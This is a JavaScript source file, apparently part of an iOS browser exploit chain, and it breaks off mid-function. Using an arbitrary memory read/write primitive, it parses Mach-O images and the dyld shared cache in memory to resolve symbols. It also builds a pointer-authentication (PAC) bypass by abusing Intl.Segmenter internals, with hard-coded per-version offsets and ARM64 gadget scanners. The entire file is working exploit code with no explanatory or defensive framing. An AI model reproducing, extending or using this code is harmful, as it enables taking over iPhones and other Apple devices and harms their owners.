























let r = {};
globalThis.moduleManager.evalCode("ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8", function () {
  let r = {};

  
  
  

  const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"), 
    {
      N: G 
    } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
    platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"), 
    {
      zn: F 
    } = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
    Z = F.Ln; 

  
  
  

  
  function Y(t, r = !1) {
    const e = platformModule.platformState.exploitPrimitive, 
      n = e.read32FromInt64(t.H(16)); 
    let s = t.H(32), 
      i = new utilityModule.Int64(0, 0), 
      o = !0, 
      h = !1, 
      c = null, 
      l = null, 
      f = null,
      a = 0, 
      u = null, 
      d = null, 
      w = null, 
      g = null, 
      m = !1; 
    const E = []; 
    for (let f = 0; f < n; f++) {
      const n = e.read32FromInt64(s), 
        f = e.read32FromInt64(s.H(4)); 
      switch (n) {
        case 15: 
          m = !0;
          break;
        case 50: 
          r && 1 === e.read32FromInt64(s.H(8)) && (w = !0, g = e.read32FromInt64(s.H(12)));
          break;
        case 25:{
            const n = {
              Xe: e.readStringFromInt64(s.H(8), 16), 
              qe: e.readInt64FromInt64(s.H(24)), 
              Eo: e.readInt64FromInt64(s.H(24)), 
              Oo: e.readInt64FromInt64(s.H(32)), 
              Qe: e.readInt64FromInt64(s.H(40)), 
              zo: e.readInt64FromInt64(s.H(48)), 
              $o: e.read32FromInt64(s.H(56)), 
              qo: e.read32FromInt64(s.H(60)), 
              Mo: e.read32FromInt64(s.H(64)), 
              flags: e.read32FromInt64(s.H(68)), 
              Do: s.H(72), 
              Lo: {}, 
              dump() {}
            };
            if (r)
            for (let t = 0; t < n.Mo; t += 1) {
              const r = n.Do.H(80 * t), 
                s = {
                  Xe: e.readStringFromInt64(r.H(16), 16), 
                  Vo: e.readStringFromInt64(r.H(0), 16), 
                  qe: e.readInt64FromInt64(r.H(32)), 
                  Oo: e.readInt64FromInt64(r.H(40)), 
                  Qe: e.read32FromInt64(r.H(48)), 
                  dump() {}
                };
              n.Lo[s.Vo] = s;
            }
            switch (E.push(n), n.Xe) {
              case "__TEXT": 
                n.Qe.Et() ? o = !1 : l = t.sub(n.Qe), i = t.sub(n.qe);
                break;
              case "__LINKEDIT": 
                u = n.qe.add(i).sub(n.Qe);
                break;
              case "__AUTH_CONST": 
                if (r) {
                  const t = n.Lo.__auth_got; 
                  void 0 !== t && (d = t.qe.add(i));
                }
            }
            break;
          }
        case 0x80000022 :
          h = !0, c = e.read32FromInt64(s.H(40)), a = e.read32FromInt64(s.H(44));
          break;
        case 0x80000033 :
          h = !0, c = e.read32FromInt64(s.H(8)), a = e.read32FromInt64(s.H(12));
      }
      s = s.H(f);
    }
    let _ = i;
    if (r && !o && !m) {
      const r = e.read32FromInt64(t.H(4)); 
      if (w && 0x0100000c  === r && g >= 0xb0000 ) {
        if (null === d) throw new Error("null === d");
        let t = e.readInt64FromInt64(d).Dt();
        if (t.Et()) throw new Error("t.Et()");
        for (t = t.Bt(t.it % 4096);
        0xFEEDFACF  !== e.read32FromInt64(t);) t = t.Bt(4096);
        const r = this.Xo(t);
        l = r.Ho.Zo, _ = r.Ho.Ko;
      }
    }
    
    for (let t = 0; t < E.length; t++) {
      const r = E[t],
        e = r.qe;
      r.qe = e.add(i);
    }
    return h && c && (f = u.H(c)), new tt({
      Go: t, 
      Jo: n, 
      Qo: i, 
      Yo: u, 
      Zo: l, 
      Ko: _, 
      th: f, 
      rh: a 
    }, E);
  }
  r.ur = function () {
    return Y(platformModule.platformState.yn, !0); 
  }, r.Xo = Y;

  
  class tt {
    constructor(t, r) {
      this.Ho = t, this.eh = r, this.nh = new Uint8Array([]), this.sh = !1;
    }
    sr() {
      return new rt(this); 
    }
    ar() {
      return new et(this); 
    }
    ih(t) {
      const r = this.oh("_" + t);
      return r ? this.Ho.Go.H(r) : new utilityModule.Int64(0, 0);
    }
    
    oh(t) {
      if (!1 === this.sh) {
        this.sh = !0;
        const t = new Uint32Array(this.Ho.rh + 3 >> 2);
        for (let r = 0; r < t.length; r++) t[r] = platformModule.platformState.exploitPrimitive.read32FromInt64(this.Ho.th.H(4 * r));
        this.nh = new Uint8Array(t.buffer);
      }
      const r = this.nh;
      let e = "",
        n = 0,
        s = !1;
      for (; !s;) {
        s = !0;
        let i = 0,
          o = 0;
        
        do {
          i += (127 & r[n]) << o, o += 7;
        } while (128 & r[n++]);
        if (e === t && 0 !== i) {
          n++;
          let t = 0;
          o = 0;
          
          do {
            t += (127 & r[n]) << o, o += 7;
          } while (128 & r[n++]);
          return t;
        }
        n += i;
        const h = r[n++]; 
        for (let i = 0; i < h; i++) {
          let i = "";
          for (; 0 !== r[n];) i += String.fromCharCode(r[n++]);
          n++;
          let h = 0;
          o = 0;
          
          do {
            h += (127 & r[n]) << o, o += 7;
          } while (128 & r[n++]);
          if (i.length && e + i === t.substr(0, e.length + i.length)) {
            e += i, n = h, s = !1;
            break;
          }
        }
      }
      return 0;
    }
  }

  
  class rt {
    constructor(t) {
      this.hh = t, this.lh = this.hh.Ho.Go;
    }
    ih(t) {
      const r = this.hh.oh("_" + t);
      return r ? this.hh.Ho.Go.H(r) : new utilityModule.Int64(0, 0);
    }
    dlsym(t) {
      const r = this.hh.oh("_" + t);
      if (!r) throw new Error("Stage2 rt.dlsym(" + t + "): symbol not found");
      return r ? this.hh.Ho.Go.H(r) : new utilityModule.Int64(0, 0);
    }
    ah(t) {
      return 0 !== this.hh.oh("_" + t);
    }
    uh(...t) {
      for (const r of t) try {
        return this.dlsym(r);
      } catch (t) {
        continue;
      }
      throw new Error("rt.uh(...t) failed");
    }
  }

  
  class et {
    constructor(t) {
      this.hh = t, this.dh = null, this.wh = this.hh.Ho.Go.yt(); 
    }
    ih(t) {
      const r = this.hh.oh("_" + t);
      return r ? this.wh + r : 0;
    }
    uh(...t) {
      for (const r of t) try {
        return this.dlsym(r);
      } catch (t) {
        continue;
      }
      throw new Error("et.uh(...t) failed");
    }
    ah(t) {
      return 0 !== this.hh.oh("_" + t);
    }
    dlsym(t) {
      const r = this.hh.oh("_" + t);
      if (!r) throw new Error("Stage2 et.dlsym(" + t + "): symbol not found");
      return this.wh + r;
    }
    
    gh(t) {
      return {
        Xe: t.Xe, 
        qe: t.qe.yt(), 
        Eo: t.Eo.yt(), 
        Oo: t.Oo.yt(), 
        Qe: t.Qe.yt(), 
        zo: t.zo.yt(), 
        $o: t.$o, 
        qo: t.qo, 
        Mo: t.Mo, 
        flags: t.flags,
        Do: t.Do.yt(), 
        Lo: t.Lo 
      };
    }
    
    mh(t) {
      return {
        Xe: t.Xe, 
        Vo: t.Vo, 
        qe: t.qe.yt(), 
        Oo: t.Oo.yt(), 
        Qe: t.Qe.yt() 
      };
    }
    
    Eh(t) {
      for (let r = 0; r < this.hh.eh.length; r++)
      if (this.hh.eh[r].Xe === t) return this.gh(this.hh.eh[r]);
      return null;
    }
    
    _h(t, r) {
      const e = this.Eh(t);
      if (null !== e) {
        if (0 !== Object.keys(e.Lo).length) {
          const t = e.Lo[r];
          return void 0 !== t ? this.mh(t) : null;
        }{
          let n = null;
          for (let s = 0; s < e.Mo; s++) {
            const i = e.Do + 80 * s,
              o = t,
              h = platformModule.platformState.exploitPrimitive.readString(i, 16),
              c = {
                Xe: o,
                Vo: h,
                qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(i + 32).add(this.hh.Ho.Qo),
                Oo: platformModule.platformState.exploitPrimitive.readInt64FromOffset(i + 40),
                Qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(i + 48)
              };
            r === h && (n = c), e.Lo[h] = c;
          }
          return n ? this.mh(n) : null;
        }
      }
      return null;
    }
    
    bh(t, r) {
      const e = this.Eh(t);
      if (null !== e)
      for (let n = 0; n < e.Mo; n++) {
        const s = e.Do + 80 * n,
          i = t,
          o = platformModule.platformState.exploitPrimitive.readString(s, 16);
        if (r === o) {
          const t = {
            Xe: i,
            Vo: o,
            qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(s + 32).add(this.hh.Ho.Qo),
            Oo: platformModule.platformState.exploitPrimitive.readInt64FromOffset(s + 40),
            Qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(s + 48)
          };
          return this.mh(t);
        }
      }
      return null;
    }
    
    ph(t) {
      const r = this.Eh(t);
      if (!r) throw new Error("Stage2 et.ph(" + t + "): segment not found");
      return r;
    }
    
    Sh() {
      return null === this.dh && (this.dh = new nt(this.hh.Ho.Ko.yt(), this.hh.Ho.Zo.yt())), this.dh;
    }
    
    xh(t) {
      const r = this.ih(t);
      return 0 !== r ? platformModule.platformState.exploitPrimitive.readInt64FromOffset(r) : new utilityModule.Int64(0, 0);
    }
    
    Ih(t) {
      const r = this.ph("__TEXT");
      return t - r.Eo + r.qe;
    }
    Th(t) {
      const r = this.ih(t);
      return 0 !== r ? platformModule.platformState.exploitPrimitive.readRawBigInt(r) : 0;
    }
    yh(t, r) {
      const e = this.ih(t);
      return 0 !== e ? platformModule.platformState.exploitPrimitive.readByte(e) : r;
    }
    
    kh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8) {
        const n = e.qe + t;
        if (platformModule.platformState.exploitPrimitive.read32(n) === r >>> 0 && platformModule.platformState.exploitPrimitive.read32(n + 4) === r / 4294967296 >>> 0) return n;
      }
      throw new Error("et.kh(t, r) failed");
    }
    
    Oh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      const n = e.qe,
        s = e.qe + e.Oo;
      return r >= n && r < s;
    }
    
    zh(t, r, e) {
      const n = this._h(t, r);
      if (null === n) throw new Error("null === n");
      const s = n.qe,
        i = n.qe + n.Oo;
      return e >= s && e < i;
    }
    
    Ph(t) {
      for (let r = 0; r < this.hh.eh.length; r++)
      if (this.Oh(this.hh.eh[r].Xe, t)) return !0;
      return !1;
    }
    
    Uh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8)
      if (platformModule.platformState.exploitPrimitive.readDoubleAsPointer(e.qe + t) === r) return e.qe + t;
      throw new Error("et.Uh(t, r) failed");
    }
    
    Ah(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8)
      if (platformModule.platformState.exploitPrimitive.readDoubleAsPointer(e.qe + t) === r) return platformModule.platformState.exploitPrimitive.readInt64FromOffset(e.qe + t);
      throw new Error("et.Ah(t, r) failed");
    }
    
    $h(t, r, e) {
      const n = this.Eh(t);
      if (null === n) throw new Error("null === n");
      const s = this.Eh(r);
      if (null === s) throw new Error("null === s");
      for (let t = 0; t < s.Oo; t += 8) {
        const r = platformModule.platformState.exploitPrimitive.readDoubleAsPointer(s.qe + t);
        if (r >= n.qe && r < n.qe + n.Oo && !0 === e(r, platformModule.platformState.exploitPrimitive.readInt64FromOffset(s.qe + t))) break;
      }
    }
    
    qh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 4) {
        const n = e.qe + t;
        if (!0 === r(n, platformModule.platformState.exploitPrimitive.read32(n))) break;
      }
    }
    
    Rh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8) {
        const n = e.qe + t;
        if (!0 === r(Z.ut(n))) break;
      }
    }
    
    Ch(t) {
      for (const r of this.hh.eh) {
        const e = Z.ut(r.qe),
          n = Z.ut(r.qe).H(utilityModule._(r.Oo));
        if (t.Pi(e) && t.Si(n)) return r;
      }
      return null;
    }
  }

  
  
  

  
  class nt {
    constructor(t, r) {
      this.Mh = t, 
      this.Dh = r, 
      this.Lh = !1, 
      this.Bh = {}, 
      this.images = this.Nh();
    }
    Vh() {
      return platformModule.platformState.exploitPrimitive.readString(this.Dh); 
    }
    Xh() {
      return "dyld_v1  arm64e" === this.Vh(); 
    }
    Zh() {
      return this.Mh; 
    }
    
    Nh() {
      const t = [];
      if (!this.Vh().startsWith("dyld")) throw new Error("!this.Vh().startsWith(dyld)"); 
      let r = platformModule.platformState.exploitPrimitive.read32(this.Dh + 24), 
        e = platformModule.platformState.exploitPrimitive.read32(this.Dh + 28); 
      
      if (0 === r && 0 === e && (this.Lh = !0, r = platformModule.platformState.exploitPrimitive.read32(this.Dh + 448), e = platformModule.platformState.exploitPrimitive.read32(this.Dh + 452), 0 === r && 0 === e)) throw new Error("0 === r && 0 === e && (this.Lh = !0, r = platformModule.platformState.exploitPrimitive.read32(this.Dh + 448), e = platformModule.platformState.exploitPrimitive.read32(this.Dh + 452), 0 === r && 0 === e)");
      for (let n = 0; n < e; n++) {
        const e = this.Dh + r + 32 * n, 
          s = platformModule.platformState.exploitPrimitive.readDoubleAsPointer(e) + this.Mh, 
          i = platformModule.platformState.exploitPrimitive.read32(e + 24), 
          o = platformModule.platformState.exploitPrimitive.readString(this.Dh + i); 
        t.push({
          address: s,
          path: o
        });
      }
      return t;
    }
    
    jh() {
      const t = [];
      for (const r of this.images) t.push(r.path);
      return t;
    }
    
    Fh(t, r) {
      return this.Hh(t).dlsym(r);
    }
    
    Kh(t) {
      for (const r of this.images) try {
        return this.Hh(r.path).dlsym(t);
      } catch (t) {
        continue;
      }
      throw new Error("nt.Kh(t) failed");
    }
    
    Gh(t) {
      for (let r = 0; r < this.images.length; r++)
      if (-1 !== this.images[r].path.indexOf(t)) return this.images[r].address;
      return 0;
    }
    
    Hh(t) {
      if (void 0 === this.Bh[t]) {
        const r = this.Gh(t);
        if (0 === r) return null;
        this.Bh[t] = Y(utilityModule.Int64.fromNumber(r)).ar(); 
      }
      return this.Bh[t];
    }
    Jh(t) {
      const r = this.Hh(t);
      if (null === r) throw new Error("null === r");
      return r;
    }
    
    Qh(...t) {
      for (const r of t) try {
        return this.Jh(r);
      } catch (t) {}
      throw new Error("nt.Qh(...t) failed");
    }
  }
  return r;
});





const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"), 
  {
    N: G, 
    tn: W, 
    nn: C, 
    Vt: m, 
    U: j, 
    An: S, 
    vn: O, 
    v: o, 
    I: u, 
    B: s 
  } = utilityModule,
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"); 






class PACBypassBase {
  constructor() {
    this.tc = null, 
    this.ic = null, 
    this.cc = !1; 
  }
  pacda(n, t) {
    return new utilityModule.Int64(0, 0);
  }
  pacia(n, t) {
    return new utilityModule.Int64(0, 0);
  }
  autda(n, t) {
    return new utilityModule.Int64(0, 0);
  }
  autia(n, t) {
    return new utilityModule.Int64(0, 0);
  }
  da = this.pacda;er = this.pacia;ha = this.autia;wa = this.autda;
}
const it = PACBypassBase;
r.sc = PACBypassBase;
r.ga = function () {
  window.log(`[PAC] Creating PACBypass instance...`);
  return new PACBypass(); 
};


class PACBypass extends PACBypassBase {
  
  pacda(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 0n));
  }
  
  pacia(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 1n));
  }
  
  autia(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 2n));
  }
  
  autda(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 3n));
  }
  da = this.pacda;er = this.pacia;wa = this.autda;ha = this.autia;
  constructor() {
    super();
    window.log(`[PAC] === PAC Bypass (Intl.Segmenter) initialization starting ===`);
    
    
    
    
    
    const n = function () {
      const n = platformModule.platformState.exploitPrimitive,
        t = new Intl.Segmenter("en", {
          Pa: "sentence" 
        }),
        o = [];
      for (let n = 0; n < 300; n++) o.push("a");
      const c = o.join(" "),
        e = t.segment(c), 
        {
          Ja: l, 
          Ya: r, 
          Oa: i, 
          ua: a, 
          Ba: s 
        } = en.Fa(e); 
      
      en.va(e, r, i, r.Ua, 0x0n, 0x12n, 0x30n);
      
      const [u, d] = n.allocCString("CFRunLoopObserverCreateWithHandler"),I = en.va(e, r, i, r.ja, d, 0x0n, 0x0n),m = n.read64(l.qa),y = n.read64(l.$a),C = (() => {
          try {
            
            n.write64(l.qa, cn(r.Ua)), n.write64(l.$a, cn(a));
            
            const t = en.va(e, r, i, I, 0x0n, 0x0n, 0x0n);
            return n.read64(t + 0x90n);
          } finally {
            
            n.write64(l.qa, m), n.write64(l.$a, y);
          }
        })(),[b, g] = n.allocCString("xmlHashScanFull"),h = en.va(e, r, i, r.ja, g, 0x0n, 0x0n, 0x0n),
        
        [p, K] = n.allocZeroBufferPair(32),[L, X] = n.allocZeroBufferPair(48),
        
        
        f = (t, o, c, l, a, s) => (n.write64(K + 0x0n, X), n.write32(K + 0x8n, 1), n.write32(K + 0xcn, 1), n.write64(X + 0x0n, 0x0n), n.write64(X + 0x8n, l), n.write64(X + 0x10n, a), n.write64(X + 0x18n, s), n.write64(X + 0x20n, o), n.write32(X + 0x28n, 1), en.va(e, r, i, h, K, t, c));
      
      if (f(C, cn(h), 0x0n, 0x0n, 0x0n, 0x0n) !== h) throw new Error("f(C, cn(h), 0x0n, 0x0n, 0x0n, 0x0n) !== h");
      return {
        Ba: s, 
        
        nu: (n, t, o) => f(C, cn(n), 0xffffffffffffn & t, 1n, t >> 48n, o),
        
        ic: (n, t, o, c) => {
          if (cn(n) === n) throw new Error("cn(n) === n"); 
          return en.va(e, r, i, n, t, o, c);
        }
      };
    }();
    
    this.Ka = n.nu, 
    this.tu = n.ic, 
    this.tc = (n, t, o) => {
      const c = n.Nt(),
        e = t.Nt(),
        l = o.Nt();
      return utilityModule.Int64.fromBigInt(this.tu(c, e, l, 0n));
    }, this.ic = (n, t, o, c) => {
      const e = n.Nt(),
        l = t.Nt(),
        r = o.Nt(),
        i = c.Nt();
      return utilityModule.Int64.fromBigInt(this.tu(e, l, r, i));
    }, this.La = utilityModule.Int64.fromBigInt(n.Ba.pacda),
    this.Xa = utilityModule.Int64.fromBigInt(n.Ba.pacia), 
    this.Ga = utilityModule.Int64.fromBigInt(n.Ba.autia), 
    this.Ma = utilityModule.Int64.fromBigInt(n.Ba.autda), 
    this.cc = !0; 
    window.log(`[PAC] === PAC Bypass initialized successfully ===`);
  }
}
const nn = PACBypass;








const segmenterOffsets = (() => {
    const n = {
      ou: 16, 
      cu: 328, 
      eu: 472, 
      lu: 512, 
      ru: 520, 
      iu: 664, 
      au: 8, 
      su: 0, 
      uu: 4, 
      du: 12, 
      Iu: 16, 
      mu: 20, 
      yu: 3, 
      Cu: 32, 
      bu: 48, 
      gu: 16, 
      hu: 44, 
      pu: 48, 
      Ku: 56, 
      Lu: 112, 
      Xu: 8, 
      fu: 24, 
      _u: 16, 
      Mu: 176, 
      Tu: 88, 
      xu: 96, 
      ku: 24, 
      Gu: 16, 
      Du: 40, 
      wu: 28, 
      Su: 24, 
      Au: 8, 
      Zu: 224, 
      zu: 8, 
      Nu: 8, 
      Ru: 16, 
      Wu: 16, 
      Hu: 32, 
      Vu: 64, 
      Qu: 16, 
      Pu: 56, 
      Ju: 0, 
      Yu: 144, 
      Ou: 152, 
      Bu: 168, 
      Eu: 0, 
      Fu: 8, 
      vu: 0, 
      Uu: 8, 
      ju: 136, 
      qu: 8, 
      $u: 312 
    };
    
    return platformModule.platformState.iOSVersion >= 160400 && (n.Du = 40), n;
  })(),
  
  on = new Proxy(segmenterOffsets, {
    get(n, t) {
      if (t in n) return n[t];
      throw new Error("segmenterOffsets.on() failed");
    }
  });
const tn = segmenterOffsets;







function cn(n) {
  return n & j(u); 
}







class nt {
  constructor(n) {
    this.images = n;
  }
  
  tl(...n) {
    for (const t of n)
    for (const n of this.images)
    if (-1 !== n.path.indexOf(t)) return null === n.ol && (n.ol = tt.init(n.ll)), n.ol;
    throw new Error("nt.tl(...n) failed");
  }
  
  static nd(n) {
    const t = tt.td(n),
      o = (() => {
        const n = t.sl("__TEXT"); 
        if (null === n) throw new Error("null === n");
        return {
          Qo: t.al - n.cl, 
          fl: t.al - n._l 
        };
      })(),
      c = platformModule.platformState.exploitPrimitive.read32(o.fl + 0x1c0n), 
      e = platformModule.platformState.exploitPrimitive.read32(o.fl + 0x1c4n), 
      l = [],
      r = o.fl + j(c);
    for (let n = 0; n < e; n++) {
      const c = cn(platformModule.platformState.exploitPrimitive.read64(r + j(32 * n))) + o.Qo, 
        e = platformModule.platformState.exploitPrimitive.read32(r + j(32 * n) + 0x18n), 
        i = platformModule.platformState.exploitPrimitive.readString(o.fl + j(e), 1024); 
      l.push({
        path: i,
        ll: c, 
        ol: t.al === c ? t : null 
      });
    }
    window.log(`[PAC] Parsed ${l.length} images from dyld shared cache`);
    return new nt(l);
  }
}







class tt {
  
  kl(n) {
    if (null !== this.Cl) {
      const t = this.Cl.Nn(n); 
      return null !== t ? this.al + j(t) : null;
    }
    throw new Error("tt.kl(n) failed");
  }
  
  sl(n) {
    const t = this.Al[n];
    return void 0 !== t ? t : null;
  }
  
  static td(n) {
    if (0n === n) throw new Error("0n === n");
    const t = (() => {
      let t = n - n % 0x1000n; 
      for (;
      0xFEEDFACF !== platformModule.platformState.exploitPrimitive.read32(t);) t -= 0x1000n;
      return t;
    })();
    return tt.init(t);
  }
  
  static init(n) {
    const t = platformModule.platformState.exploitPrimitive.read32(n + j(16)), 
      o = [];
    let c = null, 
      e = null, 
      l = 32; 
    for (let r = 0; r < t; r += 1) {
      const t = platformModule.platformState.exploitPrimitive.read32(n + j(l)), 
        r = platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(4)); 
      switch (t) {
        case 25:{
            const t = Object.create({
              Xe: platformModule.platformState.exploitPrimitive.readString(n + j(l) + j(8), 16), 
              cl: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(24)), 
              ml: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(32)), 
              _l: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(40)), 
              dl: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(48)), 
              hl: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(56)), 
              wl: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(60)), 
              flags: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(68)), 
              bl: void 0, 
              yl: (() => {
                const t = platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(64)), 
                  o = new Array(t).fill(null);
                for (const t in o) o[t] = {
                  name: platformModule.platformState.exploitPrimitive.readString(n + j(80 * t) + j(l + 72), 16), 
                  cl: platformModule.platformState.exploitPrimitive.read64(n + j(80 * t) + j(l + 72) + 0x20n), 
                  ml: platformModule.platformState.exploitPrimitive.read64(n + j(80 * t) + j(l + 72) + 0x28n), 
                  _l: platformModule.platformState.exploitPrimitive.read64(n + j(80 * t) + j(l + 72) + 0x30n), 
                  bl: void 0 
                };
                return o;
              })(),
              xl(n) {
                for (const t of this.yl)
                if (t.name === n) return t;
                return null;
              }
            });
            if ("__TEXT" === t.Xe) {
              if (null !== e) throw new Error("null !== e");
              e = n - t.cl;
            }
            o.push(t);
            break;
          }
        case 0x80000022 :
        case 0x80000033 :
          if (null !== c) throw new Error("null !== c");
          c = {
            me: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(6442450978 === t ? 40 : 8)), 
            size: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(6442450978 === t ? 44 : 12)) 
          };
      }
      l += r;
    }
    const r = {},
      i = [];
    if (null === e) throw new Error("null === e");
    
    for (const n of o) {
      n.bl = n.cl + e;
      for (const t of n.yl) t.bl = n.cl + e;
      n.Xe.length > 0 ? r[n.Xe] = n : i.push(n);
    }
    return new tt(n, r, i, c);
  }
  constructor(n, t, o, c) {
    this.al = n, 
    this.Al = t, 
    this.Sl = o, 
    this.Cl = (() => {
      if (null === c) return null;
      const n = t.__LINKEDIT; 
      if (void 0 === n) return null;
      const o = n.bl + j(c.me) - n._l, 
        e = new Uint32Array(c.size + 3 >> 2);
      for (let n = 0; n < e.length; n++) e[n] = platformModule.platformState.exploitPrimitive.read32(o + j(4 * n));
      return new ExportTrieParser(e.buffer);
    })();
  }
}







class ExportTrieParser {
  
  Nn(n) {
    const t = new TrieNodeReader(this.Tl); 
    let o = "",
      c = !1;
    for (; !c;) {
      c = !0;
      const e = t.El(); 
      if (0 !== e && n === o) {
        const n = t.El(); 
        if (8 !== n && 16 !== n) {
          return t.El(); 
        }
      }
      t.pl(e); 
      const l = t.gl(); 
      for (let e = 0; e < l; e += 1) {
        const e = t.Il(0, 4132), 
          l = t.El(); 
        if (e.length > 0 && n.startsWith(o + e)) {
          o += e, t.ue(l), c = !1; 
          break;
        }
      }
    }
    return null;
  }
  constructor(n) {
    this.Tl = n; 
  }
}
const nr = ExportTrieParser;


class TrieNodeReader {
  constructor(n) {
    this.Fl = new Uint8Array(n), 
    this.en = new DataView(n), 
    this.Pl = 0; 
  }
  
  pl(n) {
    this.Pl += n;
  }
  
  ue(n) {
    this.Pl = n;
  }
  
  gl() {
    const n = this.Fl[this.Pl];
    return this.Pl += 1, n;
  }
  
  Il(n, t = 256) {
    let o = "";
    for (let c = 0; c < t; c++) {
      const t = this.gl();
      if (t === n) return o;
      o += String.fromCharCode(t);
    }
    throw new Error("TrieNodeReader.Il(n, t) failed");
  }
  
  El() {
    let n = 0,
      t = 0;
    for (let o = 0; o < 128; o += 1) {
      const o = this.gl();
      if (n += (127 & o) << t, t += 7, 0 == (128 & o)) return n;
    }
    throw new Error("TrieNodeReader.El() failed");
  }
}
const tr = TrieNodeReader;








class or {
  constructor(n) {
    this.od = n; 
  }
  
  
  
  Ul(n) {
    const t = n.vl.kl(n.Dl); 
    if (null !== t)
    for (const o of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
      const c = n.Ll.sl(o);
      if (null !== c)
      for (let n = 0x0n; n < c.ml; n += 0x8n) {
        const o = platformModule.platformState.exploitPrimitive.read64(c.bl + n);
        if (cn(o) === t) return o; 
      }
    }
    return null;
  }
  
  
  Bl(n) {
    const t = n.ol.sl("__TEXT");
    if (null === t) return null;
    const o = n.Ol; 
    for (const c of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
      const e = n.ol.sl(c);
      if (null !== e)
      for (let n = 0x0n; n < e.ml; n += 0x8n) {
        const c = platformModule.platformState.exploitPrimitive.read64(e.bl + n),
          l = cn(c);
        
        if (t.bl <= l && l <= t.bl + t.ml && this.Nl(l, o)) return c;
      }
    }
    return null;
  }
  
  Kl(n, t, o = null) {
    const c = n.sl("__TEXT");
    if (null === c) return null;
    const e = c.bl;
    let l = null !== o ? o - c.bl : 0x0n;
    for (; l < c.ml;) {
      const n = e + l;
      if (this.Nl(n, t, !1)) return n;
      l += 0x4n; 
    }
    return null;
  }
  
  zl(n, t = 64) {
    const o = n,
      c = [];
    let e = 0x0n;
    for (; e < j(t);) {
      const n = o + e,
        t = platformModule.platformState.exploitPrimitive.read32(n);
      
      if (0x14000000n === (0xfc000000n & j(t)) || 0x94000000n === (0xfc000000n & j(t))) {
        const o = 4 * this.Hl(t); 
        c.push(n + j(o));
      }
      e += 0x4n;
    }
    return c;
  }
  
  Rl(n, t, o = 64) {
    const c = n;
    let e = 0x0n;
    for (; e < j(o);) {
      const n = c + e;
      if (this.Nl(n, t, !1)) return n;
      e += 0x4n;
    }
    return null;
  }
  
  Hl(n) {
    return n << 6 >> 6;
  }
  
  
  
  Nl(n, t, o = !0) {
    let c = 0;
    const e = [];
    
    
    for (const n of t) 0x90000000n === (0x9f000000n & j(n)) ? (e.push(0x9f00001fn), c += 1) : c > 0 && 0xf9400000n === (0xffc00000n & j(n)) ? e.push(0xffc003ffn) : 0x14000000n === (0xfc000000n & j(n)) || 0x94000000n === (0xfc000000n & j(n)) ? e.push(0xfc000000n) : e.push(0xffffffffn);
    e.length !== t.length && W(); 
    let l = n;
    for (const n in t) {
      const c = platformModule.platformState.exploitPrimitive.read32(l);
      if ((j(t[n]) & j(e[n])) != (j(c) & j(e[n]))) return !1;
      if (!0 === o && 0x14000000n === (0xfc000000n & j(c))) {
        const n = 4 * this.Hl(c);
        l += j(n); 
      } else l += 0x4n;
    }
    return !0;
  }
  
  
  Ml(n, t = 768) {
    const o = [],
      c = new Array(32).fill(null); 
    let e = !1;
    for (let l = 0; l < t; l += 4) {
      const t = n + j(l),
        r = j(platformModule.platformState.exploitPrimitive.read32(t));
      
      if (0xd65f0fffn === r || 0xd65f03c0n === r) {
        e = !0;
        break;
      }
      
      if (0x90000000n === (0x9f000000n & r)) {
        const n = r << 8n >> 13n, 
          o = r >> 29n & 3n, 
          e = 0x1fn & r, 
          l = BigInt.asIntN(32, (n << 2n | o) << 12n); 
        c[e] = t - t % 0x1000n + l;
        
      } else if (0xf9400000n === (0xffc00000n & r)) {
        const n = r >> 5n & 0x1fn, 
          t = r >> 10n & 0xfffn, 
          e = c[n];
        null !== e && (o.push(e + 0x8n * t), c[n] = null);
      }
    }
    if (!e) throw new Error("!e");
    return o;
  }
}








const en = {
  
  
  
  
  
  
  
  
  
  Fa(n) {
    const t = n[Symbol.iterator](),
      o = (() => {
        const n = platformModule.platformState.exploitPrimitive.getObjectAddress(t); 
        return platformModule.platformState.exploitPrimitive.read64(n + j(on.ou)); 
      })() + j(on.cu), 
